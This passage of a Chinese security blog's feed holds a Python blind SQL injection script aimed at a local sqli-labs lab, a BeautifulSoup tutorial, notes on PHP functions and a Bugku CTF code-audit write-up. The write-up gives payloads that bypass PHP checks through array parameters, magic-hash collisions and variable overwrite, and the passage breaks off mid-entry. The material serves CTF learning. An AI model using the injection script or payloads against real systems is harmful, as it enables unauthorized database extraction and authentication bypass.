class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"># payload: ?id=1&apos; and ascii(substr(database(),1,1))&gt;0 %23</span><br><span class="line"># len: ?id=1&apos; and length(database())&gt;0 %23</span><br><span class="line"># (select schema_name from information_schema.schemata limit 0,1)</span><br><span class="line">url = &quot;http://127.0.0.1/jishu1/sqli-labs-master/Less-5/&quot;;</span><br><span class="line">payload_len = &quot;?id=1&apos; and length(database())&lt;%d %%23&quot;</span><br><span class="line">payload = &quot;?id=1&apos; and ascii(substr(database(),%d,1))&lt;%%d %%%%23&quot;</span><br><span class="line">true_str = &quot;You are in&quot;</span><br><span class="line"></span><br><span class="line">html = requests.get(&quot;http://127.0.0.1/jishu1/sqli-labs-master/Less-5/?id&quot;)</span><br><span class="line"></span><br><span class="line">def getOneData(payload,flag=1):</span><br><span class="line">if flag==1:</span><br><span class="line">list = range(50)</span><br><span class="line">else:</span><br><span class="line">list = range(32,127)</span><br><span class="line">low = 0</span><br><span class="line">high = len(list)-1</span><br><span class="line">while low&lt;=high:</span><br><span class="line">mid = (int)((low+high)/2)</span><br><span class="line">guess = list[mid]</span><br><span class="line">print(list[low],guess,list[high])</span><br><span class="line">html = requests.get(url+payload % guess).text</span><br><span class="line">if true_str in html:</span><br><span class="line">high = mid - 1</span><br><span class="line">else:</span><br><span class="line">low = mid + 1</span><br><span class="line">if low &gt; high:</span><br><span class="line">return list[high]</span><br><span class="line"></span><br><span class="line">def getFlag(length,payload):</span><br><span class="line">result = &apos;&apos;</span><br><span class="line">for l in range(1,length+1):</span><br><span class="line">payload2 = payload % l</span><br><span class="line">result += chr(getOneData(payload2,2))</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line">getFlag(getOneData(payload_len),payload)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;二分法&quot;&gt;&lt;a href=&quot;#二分法&quot; class=&quot;headerlink&quot; title=&quot;二分法&quot;&gt;&lt;/a&gt;二分法&lt;/h2&gt;&lt;p&gt;1.初始化&lt;br&gt;设置数组范围，猜英文字符通常32~127，猜表长度通常50&lt;br&gt;2.当low&amp;lt;=high进入循环&lt;br&gt;计
      
    
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/categories/Web/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>BeautifulSoup解析</title>
    <link href="http://yoursite.com/2019/05/21/Beautifulsoup%E8%A7%A3%E6%9E%90/"/>
    <id>http://yoursite.com/2019/05/21/Beautifulsoup解析/</id>
    <published>2019-05-21T10:36:18.000Z</published>
    <updated>2019-05-21T10:39:21.572Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>一个节点可以由5个部分来概括</p><ul><li>节点名</li><li>节点内容</li><li>子节点</li><li>父亲节点</li><li>属性</li></ul><p>所以我们主要围绕两个问题：</p><ul><li>如何获得相应节点</li><li>如何从该节点获得我们需要的信息</li></ul><h2 id="获得节点"><a href="#获得节点" class="headerlink" title="获得节点"></a>获得节点</h2><p><code>soup.p</code>：获得第一个p标签节点<br><code>soup.find_all(&quot;p&quot;)</code>：获得所有p标签节点组成的list<br><code>soup.find(id=&quot;link3&quot;)</code>：通过id选择器获得指定节点</p><h2 id="获得信息"><a href="#获得信息" class="headerlink" title="获得信息"></a>获得信息</h2><p><code>soup.p.name</code>：获得节点名<br><code>soup.p.text</code>：获得节点文字内容包含子节点<br><code>soup.p.string</code>：获得节点文字内容<br><code>soup.p[&quot;class&quot;]</code>：获得属性内容<br><code>soup.p.get(&quot;class&quot;)</code>：获得属性内容<br><code>soup.p.get_text()</code>：获取文字内容</p><h2 id="Tag对象"><a href="#Tag对象" class="headerlink" title="Tag对象"></a>Tag对象</h2><p>用于找出节点的信息<br>1.获取名字<br><code>tag.name</code><br>2.获取属性<br><code>tag[&#39;id&#39;]</code><br><code>tag.attrs[&#39;id&#39;]</code><br><code>tag.get(&#39;id&#39;)</code><br>3.获得字符串<br><code>tag.string</code>：可以获得NavigableString类<br><code>tag.text</code>：获得普通str<br>4.获取子节点<br><code>tag.tag.tag</code>如<code>soup.body.b</code><br><code>soup.find_all(&#39;a&#39;)</code>遍历所有选择的子节点<br>5.获取子节点列表<br><code>tag.contents</code><br><code>tag.children</code>：子节点生成器<br>6.获取子孙节点<br><code>tag.descendants</code>：子孙节点生成器<br><code>tag.strings</code>：获得所有子孙节点的string生成器<br><code>tag.stripped_strings</code>：与上面功能相同，增加去除空格<br>7.获取父节点<br><code>tag.parent</code>：获取父亲节点<br><code>tag.parents</code>：获取父辈节点生成器<br>8.获取兄弟节点<br><code>tag.next_sibling</code>：获取兄弟节点，包括string<br><code>tag.previous_sibling</code><br><code>tag.next_siblings</code>：兄弟节点生成器<br><code>tag.previous_siblings</code></p><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>用于找到想要的节点<br><strong>find_all( name , attrs , recursive , text , **kwargs )</strong><br>1.通过name直接查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(&apos;b&apos;)</span><br><span class="line"># [&lt;b&gt;The Dormouse&apos;s story&lt;/b&gt;]</span><br></pre></td></tr></table></figure></p><p>2.正则表达式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for tag in soup.find_all(re.compile(&quot;^b&quot;)):</span><br><span class="line">    print(tag.name)</span><br><span class="line"># body</span><br><span class="line"># b</span><br></pre></td></tr></table></figure></p><p>3.构造器<br>如果没有合适的过滤器能够进行筛选，我们可以自己进行构造<br>如：要寻找class为title的p标签<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def class_title(tag):</span><br><span class="line">attr = tag.get(&apos;class&apos;)</span><br><span class="line">if attr != None:</span><br><span class="line">return attr[0] == &apos;title&apos;</span><br><span class="line">else:</span><br><span class="line">return False</span><br><span class="line"></span><br><span class="line">soup.find_all(class_title)</span><br><span class="line"># [&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&apos;s story&lt;/b&gt;&lt;/p&gt;]</span><br></pre></td></tr></table></figure></p><p>4.通过属性查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(href=re.compile(&quot;elsie&quot;), id=&apos;link1&apos;)</span><br><span class="line"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;three&lt;/a&gt;]</span><br></pre></td></tr></table></figure></p><p>5.通过字典搜索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data_soup.find_all(attrs=&#123;&quot;data-foo&quot;: &quot;value&quot;&#125;)</span><br><span class="line"># [&lt;div data-foo=&quot;value&quot;&gt;foo!&lt;/div&gt;]</span><br></pre></td></tr></table></figure></p><p>6.通过class搜索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">css_soup.find_all(&quot;p&quot;, class_=&quot;body strikeout&quot;)</span><br><span class="line"># [&lt;p class=&quot;body strikeout&quot;&gt;&lt;/p&gt;]</span><br></pre></td></tr></table></figure></p><p>7.通过text搜索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(text=&quot;Elsie&quot;)</span><br><span class="line"># [u&apos;Elsie&apos;]</span><br></pre></td></tr></table></figure></p><p>8.通过limit限制搜索数量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(&quot;a&quot;, limit=2)</span><br><span class="line"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span><br><span class="line">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]</span><br></pre></td></tr></table></figure></p><p>9.recursive 参数<br>调用tag的 find_all() 方法时,Beautiful Soup会检索当前tag的所有子孙节点,如果只想搜索tag的直接子节点,可以使用参数 recursive=False .<br>10.简写<br><code>soup.find_all()</code>等价于<code>soup()</code></p><h2 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h2><p><code>soup.select(#id)</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;一个节点可以由5个部分来概括&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;节点名&lt;/li&gt;
&lt;li&gt;节点内容&lt;/li&gt;
&lt;li&gt;子节点&lt;/li&gt;
&lt;li&gt;父亲
      
    
    </summary>
    
      <category term="编程" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="编程" scheme="http://yoursite.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>代码审计相关函数分析</title>
    <link href="http://yoursite.com/2019/05/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9A%84%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/05/13/代码审计的相关函数分析/</id>
    <published>2019-05-13T12:49:18.000Z</published>
    <updated>2019-05-13T12:50:25.422Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-GET"><a href="#0x01-GET" class="headerlink" title="0x01. \$_GET"></a>0x01. \$_GET</h2><p>$_GET函数经常是ctf解题入口，该函数可以传递数组<br>get.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump($_GET);</span><br></pre></td></tr></table></figure></p><p>(1) 传递多个值优先选择后一个值<br><img src="/img/1557406692081.png" alt="Alt text"><br>(2) 传递数组<br><img src="/img/1557406781122.png" alt="Alt text"><br>(3) array&gt;数字</p><p>附：$_POST同样有效</p><h2 id="0x02-extract"><a href="#0x02-extract" class="headerlink" title="0x02. extract"></a>0x02. extract</h2><p>将键名摘取为变量值，键值作为变量值</p><h2 id="0x03-strcmp"><a href="#0x03-strcmp" class="headerlink" title="0x03. strcmp"></a>0x03. strcmp</h2><p>传入数组返回Null</p><h2 id="0x04-strpos"><a href="#0x04-strpos" class="headerlink" title="0x04. strpos"></a>0x04. strpos</h2><p>传入数组返回null</p><h2 id="0x05-ereg"><a href="#0x05-ereg" class="headerlink" title="0x05. ereg"></a>0x05. ereg</h2><p>传入数组返回null</p><h2 id="0x06-is-numeric"><a href="#0x06-is-numeric" class="headerlink" title="0x06. is_numeric"></a>0x06. is_numeric</h2><p>可以传入<code>&#39;数字+字母&#39;</code>绕过判断，如<code>&#39;123a&#39;</code>比较可被当成数字，即<code>&#39;123a&#39;&gt;&#39;123&#39;</code></p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07. {}"></a>0x07. {}</h2><p>选取字符串中的字符可用{}进行选取，如\$str = ‘abc’，那么$str{1}即为a</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-GET&quot;&gt;&lt;a href=&quot;#0x01-GET&quot; class=&quot;headerlink&quot; title=&quot;0x01. \$_GET&quot;&gt;&lt;/a&gt;0x01. \$_GET&lt;/h2&gt;&lt;p&gt;$_GET函数经常是ctf解题入口，该函数可以传递数组&lt;br&gt;get.php
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>bugku代码审计wp</title>
    <link href="http://yoursite.com/2019/05/13/bugku%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1wp/"/>
    <id>http://yoursite.com/2019/05/13/bugku代码审计wp/</id>
    <published>2019-05-13T12:44:23.000Z</published>
    <updated>2019-05-13T12:44:46.422Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-extract变量覆盖"><a href="#0x01-extract变量覆盖" class="headerlink" title="0x01. extract变量覆盖"></a>0x01. extract变量覆盖</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$flag=&apos;xxx&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($shiyan))</span><br><span class="line">&#123;</span><br><span class="line">$content=trim(file_get_contents($flag));</span><br><span class="line">if($shiyan==$content)</span><br><span class="line">&#123;</span><br><span class="line">echo&apos;flag&#123;xxx&#125;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo&apos;Oh.no&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>\$shiyan和$flag变量由<code>extract</code>变量覆盖进行控制<br>$content变量由<code>file_get_contents</code>函数通过<code>php://input</code>进行控制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/1.php?shiyan=1&amp;flag=php://input</span><br><span class="line">1</span><br></pre></td></tr></table></figure></p><h2 id="0x02-strcmp比较字符串"><a href="#0x02-strcmp比较字符串" class="headerlink" title="0x02. strcmp比较字符串"></a>0x02. strcmp比较字符串</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&apos;a&apos;])) &#123;</span><br><span class="line">if (strcmp($_GET[&apos;a&apos;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">//比较两个字符串（区分大小写）</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;No&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>strcmp</code>函数遇到数组后，会出错返回null，而<code>null==0</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/6.php?a[]</span><br></pre></td></tr></table></figure></p><h2 id="0x03-urldecode二次编码绕过"><a href="#0x03-urldecode二次编码绕过" class="headerlink" title="0x03. urldecode二次编码绕过"></a>0x03. urldecode二次编码绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">echo(&quot;</span><br><span class="line"></span><br><span class="line">not allowed!</span><br><span class="line"></span><br><span class="line">&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;</span><br><span class="line">Access granted!</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">echo &quot;</span><br><span class="line">flag</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二次编码绕过</p><h2 id="0x04-md5-函数"><a href="#0x04-md5-函数" class="headerlink" title="0x04. md5()函数"></a>0x04. md5()函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">if (isset($_GET[&apos;username&apos;]) and isset($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">if ($_GET[&apos;username&apos;] == $_GET[&apos;password&apos;])</span><br><span class="line">print &apos;Your password can not be your username.&apos;;</span><br><span class="line">else if (md5($_GET[&apos;username&apos;]) === md5($_GET[&apos;password&apos;]))</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;Invalid password&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入数组绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure></p><h2 id="0x05-数组返回NULL绕过"><a href="#0x05-数组返回NULL绕过" class="headerlink" title="0x05. 数组返回NULL绕过"></a>0x05. 数组返回NULL绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line"></span><br><span class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</span><br><span class="line">echo &apos;You password must be alphanumeric&apos;;</span><br><span class="line">else if (strpos ($_GET[&apos;password&apos;], &apos;--&apos;) !== FALSE)</span><br><span class="line">die(&apos;Flag: &apos; . $flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;Invalid password&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ereg传入数组返回null，strpos传入数组返回null<br>paload: ?password[]</p><h2 id="0x06-弱类型整数大小比较绕过"><a href="#0x06-弱类型整数大小比较绕过" class="headerlink" title="0x06. 弱类型整数大小比较绕过"></a>0x06. 弱类型整数大小比较绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$temp = $_GET[&apos;password&apos;];</span><br><span class="line">is_numeric($temp)?die(&quot;no numeric&quot;):NULL;</span><br><span class="line">if($temp&gt;1336)&#123;</span><br><span class="line">echo $flag;</span><br></pre></td></tr></table></figure><p>传入’1337a’可以绕过is_numeric</p><h2 id="0x07-sha-函数比较绕过"><a href="#0x07-sha-函数比较绕过" class="headerlink" title="0x07. sha()函数比较绕过"></a>0x07. sha()函数比较绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line">if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">var_dump($_GET[&apos;name&apos;]);</span><br><span class="line">echo &quot;</span><br><span class="line">&quot;;</span><br><span class="line">var_dump($_GET[&apos;password&apos;]);</span><br><span class="line">var_dump(sha1($_GET[&apos;name&apos;]));</span><br><span class="line">var_dump(sha1($_GET[&apos;password&apos;]));</span><br><span class="line">if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])</span><br><span class="line">echo &apos;</span><br><span class="line"></span><br><span class="line">Your password can not be your name!</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;</span><br><span class="line">Invalid password.</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">echo &apos;</span><br><span class="line">Login first!</span><br><span class="line"></span><br><span class="line">&apos;;</span><br></pre></td></tr></table></figure><p>哈希算法，传入数组返回null<br>payload:?name[]=1&amp;password[]=2</p><h2 id="0x08-md5加密相等绕过"><a href="#0x08-md5加密相等绕过" class="headerlink" title="0x08. md5加密相等绕过"></a>0x08. md5加密相等绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$md51 = md5(&apos;QNKCDZO&apos;);</span><br><span class="line">$a = @$_GET[&apos;a&apos;];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">echo &quot;flag&#123;*&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &quot;false!!!&quot;;</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo &quot;please input a&quot;;&#125;</span><br></pre></td></tr></table></figure><p>QNKCDZO的哈希值为0e830400451993494058024219903391<br>s878926199a的哈希值为0e545993274517709034328855841020<br>php弱类型 ‘0e数字’ == ‘0e数字’<br>payload:?a=s878926199a</p><h2 id="0x09-十六进制与数字比较"><a href="#0x09-十六进制与数字比较" class="headerlink" title="0x09. 十六进制与数字比较"></a>0x09. 十六进制与数字比较</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)</span><br><span class="line">&#123;</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">$one = ord(&apos;1&apos;); //ord — 返回字符的 ASCII 码值</span><br><span class="line">$nine = ord(&apos;9&apos;); //ord — 返回字符的 ASCII 码值</span><br><span class="line">$number = &apos;3735929054&apos;;</span><br><span class="line">// Check all the input characters!</span><br><span class="line">for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">&#123;</span><br><span class="line">// Disallow all the digits!</span><br><span class="line">$digit = ord($temp&#123;$i&#125;);</span><br><span class="line">if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">&#123;</span><br><span class="line">// Aha, digit not allowed!</span><br><span class="line">return &quot;flase&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if($number == $temp)</span><br><span class="line">return $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[&apos;password&apos;];</span><br><span class="line">echo noother_says_correct($temp);</span><br></pre></td></tr></table></figure><p>ascii值在1~9过滤掉，而php弱类型比较 ‘16进制’ == ‘10进制’，可以绕过<br>paylaod:password=0xdeadc0de</p><h2 id="0x10-ereg正则-00截断"><a href="#0x10-ereg正则-00截断" class="headerlink" title="0x10. ereg正则%00截断"></a>0x10. ereg正则%00截断</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;xxx&quot;;</span><br><span class="line">if (isset ($_GET[&apos;password&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;</span><br><span class="line"></span><br><span class="line">You password must be alphanumeric</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line">if (strpos ($_GET[&apos;password&apos;], &apos;-&apos;) !== FALSE) //strpos — 查找字符串首次出现的位置</span><br><span class="line">&#123;</span><br><span class="line">die(&apos;Flag: &apos; . $flag);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo(&apos;</span><br><span class="line">- have not been found</span><br><span class="line"></span><br><span class="line">&apos;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;</span><br><span class="line">Invalid password</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用数组&gt;数字，并且ereg和strlen和strpos传入数组均为null可以绕过<br>payload：?password[]</p><h2 id="0x11-strpos数组绕过"><a href="#0x11-strpos数组绕过" class="headerlink" title="0x11. strpos数组绕过"></a>0x11. strpos数组绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line">if (isset ($_GET[&apos;ctf&apos;])) &#123;</span><br><span class="line">if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;ctf&apos;]) === FALSE)</span><br><span class="line">echo &apos;必须输入数字才行&apos;;</span><br><span class="line">else if (strpos ($_GET[&apos;ctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;骚年，继续努力吧啊~&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>老知识点，ereg和strpos传入数组返回null可以绕过<br>paylaod: ?ctf[]</p><h2 